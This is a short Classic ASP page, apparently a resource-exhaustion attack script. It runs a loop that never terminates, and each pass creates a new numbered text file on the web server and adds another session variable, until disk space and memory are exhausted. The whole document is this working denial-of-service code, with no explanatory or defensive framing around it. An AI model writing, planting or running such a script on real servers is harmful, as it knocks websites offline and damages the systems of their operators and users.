<%
	set fso=server.CreateObject("scripting.filesystemobject")
	i=1
	do while not i=0
	fso.createtextfile(Server.mappath(i&".txt"))
	session(i)=i
	i=i+1
	loop
%>